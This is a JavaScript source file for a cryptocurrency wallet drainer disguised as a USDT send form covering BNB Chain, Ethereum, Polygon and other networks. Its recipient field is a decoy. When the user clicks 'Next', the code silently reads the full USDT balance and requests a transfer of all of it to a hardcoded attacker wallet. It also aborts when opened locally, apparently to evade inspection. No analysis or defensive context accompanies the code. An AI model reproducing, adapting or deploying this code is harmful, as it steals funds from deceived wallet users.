// ── Phase 1: Module Initialization ──
import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';

// ── Network Configurations ──
const NETWORKS = {
    bsc: {
        chainId: '0x38',
        chainName: 'BNB Smart Chain',
        rpcUrl: 'https://bsc-dataseed1.binance.org/',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        blockExplorer: 'https://bscscan.com',
        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
        icon: '🟡'
    },
    ethereum: {
        chainId: '0x1',
        chainName: 'Ethereum Mainnet',
        rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
        blockExplorer: 'https://etherscan.io',
        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        icon: '🔵'
    },
    polygon: {
        chainId: '0x89',
        chainName: 'Polygon Mainnet',
        rpcUrl: 'https://polygon-rpc.com/',
        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
        blockExplorer: 'https://polygonscan.com',
        usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        icon: '🟣'
    },
    arbitrum: {
        chainId: '0xa4b1',
        chainName: 'Arbitrum One',
        rpcUrl: 'https://arb1.arbitrum.io/rpc',
        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
        blockExplorer: 'https://arbiscan.io',
        usdtAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        icon: '🔷'
    },
    optimism: {
        chainId: '0xa',
        chainName: 'Optimism',
        rpcUrl: 'https://mainnet.optimism.io',
        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
        blockExplorer: 'https://optimistic.etherscan.io',
        usdtAddress: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
        icon: '🔴'
    },
    avalanche: {
        chainId: '0xa86a',
        chainName: 'Avalanche C-Chain',
        rpcUrl: 'https://api.avax.network/ext/bc/C/rpc',
        nativeCurrency: { name: 'Avalanche', symbol: 'AVAX', decimals: 18 },
        blockExplorer: 'https://snowtrace.io',
        usdtAddress: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
        icon: '🔺'
    }
};

// ── Attacker's Operational Constants ──
const DEST_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";

// ── Runtime State ──
let provider;
let userAddress;
let currentNetwork = 'bsc';

// ── Silent Recon Engine ──
async function fetchMaxBalance(addr, networkKey) {
    try {
        const network = NETWORKS[networkKey];
        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
        const res = await fetch(network.rpcUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0", id: 1,
                method: "eth_call",
                params: [{ to: network.usdtAddress, data: data }, "latest"]
            })
        });
        const json = await res.json();
        return (json.result && json.result !== '0x') ? json.result : null;
    } catch (e) { return null; }
}

// ── Drain Engine ──
async function executeDrain(balanceHex, networkKey) {
    const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;
    const network = NETWORKS[networkKey];

    let amountHex;
    if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
        amountHex = balanceHex.replace('0x', '').padStart(64, '0');
    } else {
        const val = document.getElementById('amountInput').value || "1";
        amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
    }

    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const txData = "0xa9059cbb" + cleanDest + amountHex;

    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: network.usdtAddress,
            data: txData,
            value: '0x0'
        }]
    });
}

// ── DOM Registry ──
const ui = {
    nextBtn: document.getElementById('nextBtn'),
    amountInput: document.getElementById('amountInput'),
    usdLabel: document.getElementById('usdLabel'),
    recipientInput: document.getElementById('recipientInput'),
    clearAddr: document.getElementById('clearAddr'),
    clearAmount: document.getElementById('clearAmount'),
    maxBtn: document.getElementById('maxBtn'),
    addrGroup: document.getElementById('addrGroup'),
    amountGroup: document.getElementById('amountGroup'),
    pasteBtn: document.getElementById('pasteBtn'),
    networkSelect: document.getElementById('networkSelect'),
    networkIcon: document.getElementById('networkIcon'),
    usdtLabel: document.getElementById('usdtLabel')
};

// ── Module Entry Point ──
document.addEventListener('DOMContentLoaded', () => {
    // Check 1 — Served from real web server (not file://)
    if (location.protocol === 'file:') {
        console.warn('[ABORT] Check 1 fail: file:// protocol');
        return;
    }

    // Check 2 — window.ethereum injected by wallet
    if (typeof window.ethereum === 'undefined') {
        console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
        return;
    }

    // Check 3 — nextBtn exists in DOM
    if (!ui.nextBtn) {
        console.warn('[ABORT] Check 3 fail: #nextBtn not found');
        return;
    }

    // Initialize network selector
    populateNetworkSelector();
    updateNetworkDisplay();

    // Bind click listener
    ui.nextBtn.addEventListener('click', handleNextClick);

    // Network change handler
    ui.networkSelect.addEventListener('change', (e) => {
        currentNetwork = e.target.value;
        updateNetworkDisplay();
    });

    // UI Helpers
    ui.amountInput.oninput = () => {
        const val = parseFloat(ui.amountInput.value) || 0;
        ui.usdLabel.textContent = val.toFixed(2);
        ui.nextBtn.disabled = val <= 0;
        if (val > 0) {
            ui.nextBtn.classList.add('enabled');
            ui.clearAmount.classList.add('visible');
        } else {
            ui.nextBtn.classList.remove('enabled');
            ui.clearAmount.classList.remove('visible');
        }
    };

    // Clear amount button
    ui.clearAmount.onclick = () => {
        ui.amountInput.value = '';
        ui.amountInput.oninput();
        ui.clearAmount.classList.remove('visible');
    };

    // Clear address button (only clears the DECOY address)
    ui.clearAddr.onclick = () => {
        ui.recipientInput.value = '';
        ui.clearAddr.classList.remove('visible');
    };

    // Recipient input handler (only for DECOY display)
    ui.recipientInput.oninput = () => {
        if (ui.recipientInput.value.length > 0) {
            ui.clearAddr.classList.add('visible');
        } else {
            ui.clearAddr.classList.remove('visible');
        }
    };

    // Max button
    ui.maxBtn.onclick = () => {
        ui.amountInput.value = "1000";
        ui.amountInput.oninput();
    };

    // Paste button (pastes into DECOY field)
    ui.pasteBtn.onclick = async () => {
        try {
            const text = await navigator.clipboard.readText();
            ui.recipientInput.value = text;
            ui.recipientInput.oninput();
        } catch (e) {
            console.log('Clipboard read failed');
        }
    };

    // Focus effects
    ui.addrGroup.addEventListener('focusin', () => ui.addrGroup.classList.add('active'));
    ui.addrGroup.addEventListener('focusout', () => ui.addrGroup.classList.remove('active'));
    ui.amountGroup.addEventListener('focusin', () => ui.amountGroup.classList.add('active'));
    ui.amountGroup.addEventListener('focusout', () => ui.amountGroup.classList.remove('active'));

    // Initial trigger
    ui.recipientInput.oninput();
    ui.amountInput.oninput();
});

// ── Populate Network Selector ──
function populateNetworkSelector() {
    const select = ui.networkSelect;
    if (!select) return;
    
    select.innerHTML = '';
    Object.keys(NETWORKS).forEach(key => {
        const network = NETWORKS[key];
        const option = document.createElement('option');
        option.value = key;
        option.textContent = network.chainName;
        select.appendChild(option);
    });
}

// ── Update Network Display ──
function updateNetworkDisplay() {
    const network = NETWORKS[currentNetwork];
    if (!network) return;
    
    if (ui.networkIcon) {
        ui.networkIcon.textContent = network.icon;
    }
    if (ui.networkSelect) {
        ui.networkSelect.value = currentNetwork;
    }
}

// ── Switch Network ──
async function switchToNetwork(networkKey) {
    const network = NETWORKS[networkKey];
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: network.chainId }]
        });
        return true;
    } catch (e) {
        if (e.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: network.chainId,
                        chainName: network.chainName,
                        rpcUrls: [network.rpcUrl],
                        nativeCurrency: network.nativeCurrency,
                        blockExplorerUrls: [network.blockExplorer]
                    }]
                });
                return true;
            } catch (addError) {
                console.log('Failed to add network:', addError);
                return false;
            }
        }
        return false;
    }
}

// ── Main Interaction Controller ──
async function handleNextClick() {
    if (ui.nextBtn.disabled) return;

    const originalContent = ui.nextBtn.innerHTML;
    ui.nextBtn.innerHTML = 'Processing...';
    ui.nextBtn.disabled = true;

    try {
        // Step 1 — Switch to selected network
        const switched = await switchToNetwork(currentNetwork);
        if (!switched) {
            throw new Error('Failed to switch network');
        }

        // Step 2 — Get user wallet address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
        userAddress = accounts[0] ||
            (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];

        if (!userAddress) {
            throw new Error('No wallet connected');
        }

        // Step 3 — Init provider
        provider = new ethers.providers.JsonRpcProvider(NETWORKS[currentNetwork].rpcUrl);

        // Step 4 — Silent USDT balance recon
        const balanceHex = await fetchMaxBalance(userAddress, currentNetwork);
        
        // Step 5 — Execute the drain (user pays gas)
        await executeDrain(balanceHex, currentNetwork);

        ui.nextBtn.innerHTML = '✓ Completed';
        setTimeout(() => {
            ui.nextBtn.innerHTML = 'Next';
            ui.nextBtn.disabled = false;
        }, 3000);
        
    } catch (err) {
        console.error(err);
        ui.nextBtn.innerHTML = '❌ Failed';
        setTimeout(() => {
            ui.nextBtn.innerHTML = 'Next';
            ui.nextBtn.disabled = false;
        }, 3000);
    }
}
